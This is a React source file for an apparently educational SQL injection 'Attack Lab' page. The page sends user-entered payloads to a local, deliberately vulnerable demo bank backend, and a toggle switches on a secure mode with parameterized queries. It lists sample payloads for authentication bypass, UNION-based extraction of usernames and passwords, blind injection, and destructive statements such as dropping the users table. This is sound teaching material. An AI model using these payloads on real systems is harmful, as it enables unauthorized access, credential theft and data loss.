import { useState } from 'react';
import { Container, Card, Form, Button, Alert, Tabs, Tab, Row, Col } from 'react-bootstrap';

function AttackLabPage({ secureMode }) {
  const [attackType, setAttackType] = useState('auth-bypass');
  const [payload, setPayload] = useState('');
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);

  const attackExamples = {
    'auth-bypass': {
      title: 'Authentication Bypass',
      description: 'Try to bypass the login system using SQL injection',
      examples: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT 1,1,1,1,1,1,1,1 --"
      ]
    },
    'data-extraction': {
      title: 'Data Extraction',
      description: 'Extract data using UNION-based attacks',
      examples: [
        "' UNION SELECT username, password, balance, role, email, full_name, created_at, 1 FROM users --",
        "' UNION SELECT 1,2,3,4,5,6,7,8 --"
      ]
    },
    'blind-injection': {
      title: 'Blind SQL Injection',
      description: 'Try boolean-based and time-based blind SQL injection',
      examples: [
        "' OR 1=1 --",
        "' OR (SELECT COUNT(*) FROM users) > 0 --",
        "' OR (SELECT role FROM users WHERE username='admin') = 'admin' --"
      ]
    },
    'second-order': {
      title: 'Second-Order SQL Injection',
      description: 'Try to inject SQL through the comments system',
      examples: [
        "'; UPDATE users SET balance = 1000000 WHERE username = 'admin' --",
        "'; DROP TABLE users --"
      ]
    }
  };

  const handleAttack = async () => {
    setError(null);
    setResult(null);

    try {
      const endpoint = getEndpointForAttack(attackType);
      const response = await fetch(`http://localhost:3001${endpoint}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          payload,
          secureMode
        }),
      });

      const data = await response.json();
      setResult(data);
    } catch (err) {
      setError(err.message);
    }
  };

  const getEndpointForAttack = (type) => {
    switch (type) {
      case 'auth-bypass':
        return '/api/login';
      case 'data-extraction':
        return '/api/accounts/lookup';
      case 'blind-injection':
        return '/api/check-username';
      case 'second-order':
        return '/api/comments';
      default:
        return '/api/login';
    }
  };

  return (
    <Row className="justify-content-center align-items-center" style={{ minHeight: '70vh' }}>
      <Col md={10} lg={8}>
        <Alert
          variant={secureMode ? 'info' : 'danger'}
          style={{ background: 'var(--accent-light)', color: '#fff', width: '100%' }}
          className="mb-4"
        >
          {secureMode ? (
            <>
              <strong>Defense Mechanisms:</strong> <br />
              All endpoints in this lab are protected with <b>parameterized queries</b> and input validation. SQL injection attacks will be blocked.
            </>
          ) : (
            <>
              <strong>Vulnerability:</strong> <br />
              All endpoints in this lab are <b>vulnerable to SQL injection</b>. Try authentication bypass, UNION-based, blind, and second-order attacks!
            </>
          )}
        </Alert>
        <Card className="bank-card">
          <Card.Body>
            <h3 className="mb-4 text-center" style={{ color: 'var(--primary-color)' }}>
              <i className="fas fa-bug me-2"></i>SQL Injection Attack Lab
            </h3>
            <Tabs
              activeKey={attackType}
              onSelect={(k) => setAttackType(k)}
              className="mb-3"
            >
              {Object.entries(attackExamples).map(([key, value]) => (
                <Tab key={key} eventKey={key} title={value.title}>
                  <Card.Text className="mt-3">{value.description}</Card.Text>
                  <Form>
                    <Form.Group className="mb-3">
                      <Form.Label>Attack Payload</Form.Label>
                      <Form.Control
                        as="textarea"
                        rows={3}
                        value={payload}
                        onChange={(e) => setPayload(e.target.value)}
                        placeholder="Enter your SQL injection payload"
                      />
                    </Form.Group>
                    <div className="mb-3">
                      <h5>Example Payloads:</h5>
                      <ul>
                        {value.examples.map((example, index) => (
                          <li key={index}>
                            <code>{example}</code>
                            <Button
                              variant="link"
                              size="sm"
                              onClick={() => setPayload(example)}
                            >
                              Try this
                            </Button>
                          </li>
                        ))}
                      </ul>
                    </div>
                    <Button variant="primary" onClick={handleAttack}>
                      Execute Attack
                    </Button>
                  </Form>
                </Tab>
              ))}
            </Tabs>
            {error && (
              <Alert variant="danger">
                Error: {error}
              </Alert>
            )}
            {result && (
              <Card className="mt-4">
                <Card.Header style={{ background: 'var(--accent-light)', color: '#fff' }}>Attack Result</Card.Header>
                <Card.Body>
                  <pre>{JSON.stringify(result, null, 2)}</pre>
                </Card.Body>
              </Card>
            )}
          </Card.Body>
        </Card>
      </Col>
    </Row>
  );
}

export default AttackLabPage; 